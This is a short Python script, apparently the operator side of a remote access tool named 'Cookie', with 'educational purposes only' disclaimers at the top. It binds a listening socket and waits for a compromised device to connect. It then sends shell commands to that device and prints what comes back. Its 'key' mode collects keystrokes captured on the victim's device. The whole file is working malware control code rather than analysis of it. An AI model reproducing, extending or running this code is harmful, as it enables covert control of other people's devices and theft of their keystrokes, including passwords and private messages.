 
#Code and Developed By Caleb Gucciardi
#I take no responsibility for this code
#Software created for educational purposes only
#Use only in a protected and authorized environment
#--FreeSoftware--CopyLeft--MakeItBetter--
#Coockie v1.0

import socket
from threading import Thread

# var for thread comunication
sem="1"
push="" # this is the buffer of the thread

# this is the keylogger mode
class listener(Thread):
    def run(self):
        global sem,push
        print("--write 'esc' for <com::>--")
        print("--write 'push' for print buffer--")
        while 1:
            s=raw_input("key::") # Qpython mode
            if(s=="push"):
                print(push) # print buffer
                push=""
            elif(s=="esc"):
                sem="0" # turn of the thread
                break

# manual or help
def man():
    print("------------------------------------------------")
    print("--Cookie Help--")
    print("--when you are in <com::> you can send a command--")
    print("--when you are in <key::> you are in keylogger mode-- write 'esc' for back in <com::>")
    print("--type [key] it will start <key::> keylogger mode")
    print("----------------------------------------------")

# keylogger 
def keylogger():
    global com,sem,push
    sem="1"
    push=""
    l = listener()
    l.start() # start the thread
    while sem=="1": # until type quit
        c.send(com.encode())
        t = c.recv(1024) #confirm == cookie
        push+=t.decode()
    print("Quit from <key::>")
    c.send("esc".encode())
    com = "cookie" # it is a confirm for cookie server
    

print("---Cookie  QPython v1.0---")

#main

s = socket.socket()

host=raw_input("IPServer::")
port=7373 # you can change this, depends of your port forward
confirm = "cookie"

s.bind((host,port))
s.listen(5)
print("Waiting for Cookie...")
c,addr=s.accept()

print("---------------------------------------")
print("---Digit help for a list of commands---")
print("---------------------------------------")

confirm = c.recv(1024) #confirm == cookie
print(confirm.decode())


while 1:
    com=raw_input("com::")
    if(com=="help"): man()
    elif(com=="key"): 
        keylogger()
        continue 
    elif(com=="close"):
        c.close()
        s.close()
        break
    c.send(com.encode())
    output=c.recv(4096)
    print(output.decode())
    confirm = c.recv(1024) #confirm == cookie
print("Bye bye..")

